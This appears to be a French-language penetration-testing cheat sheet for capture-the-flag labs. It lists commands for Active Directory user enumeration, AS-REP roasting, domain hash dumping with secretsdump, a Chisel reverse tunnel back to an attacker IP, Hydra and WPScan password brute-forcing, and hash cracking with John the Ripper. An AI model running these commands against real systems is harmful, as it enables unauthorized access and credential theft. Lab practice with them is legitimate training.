- [Active Directory](#Active-Directory)
  - [Kerbrute](#Kerbrute)
  - [GetNPUUsers.py](#GetNPUUsers.py)
  - [Secretsdump.py](#Secretsdump.py)
- [Binwalk](#Binwalk)
- [Chisel](#Chisel)
- [Hydra](#Hydra)
  - [WEB](#WEB)
  - [SSH](#SSH)
  - [FTP](#FTP)   
- [JohnTheRipper](#JohnTheRipper)
- [Steghide](#Steghide)
- [WPSCAN](#WPSCAN)
- [7z Deziper avec password](#7z-Deziper-avec-password)


## Active Directory

### Kerbrute
```
kerbute userenum --dc 10.10.117.125 -d spookysec.local user_list.txt
```
### GetNPUsers.py
```
python /opt/impacket/examples/GetNPUsers.py -no-pass -usersfile user.txt -dc-ip 10.10.117.125 spookysec.local/
```
### Secretsdump.py
```
python3 /opt/impacket/examples/secretsdump.py -just-dc <user>@10.10.117.125
```

<br>
<br>

## Binwalk

```
binwalk <image> -e
```
<br>
<br>

## Chisel

```
chisel server -p 8001 --reverse
```
```
./chisel_amd64 client 10.50.111.37:8001 R:socks &
```
#### Port distant vers port local

```
./chisel.exe client 10.14.50.100:8001 R:2805:10.10.2.0:2805
```
`10.14.50.100`: Attacker IP
<br>
`8001`: Port établie lors de la création du serveur
<br>
<br>
`2805:10.10.2.0:2805` -> Bind le port 2805 de la machine Attacker au port 2805 de la machine distante 

<br>
<br>

## Hydra
### WEB
```
hydra -l molly -P /usr/share/wordlists/rockyou.txt 10.10.0.156 http-post-form "/login:username=^USER^&password=^PASS^:Your username or password is incorrect."
```
### SSH
```
hydra -l molly -P /usr/share/wordlists/rockyou.txt ssh://10.10.0.156
```
### FTP
```
hydra -l <user> -P /usr/share/wordlists/rockyou.txt ftp://<ip>
```
<br>

## JohnTheRipper

```
zip2john file.zip > zip.hash 
john file.zip zip.hash

```
```
zip2john
ssh2john
rar2john
```

<br>

## Steghide

```
steghide extract -sf image.jpg
```

<br>

## WPSCAN

```
wpscan --url 10.10.188.11 -U kwheel -P /usr/share/wordlists/rockyou.txt
```
Fonctionne aussi avec une liste de user pour l'option `-U`

<br>

## 7z Deziper avec password

```
7z e file.zip
```
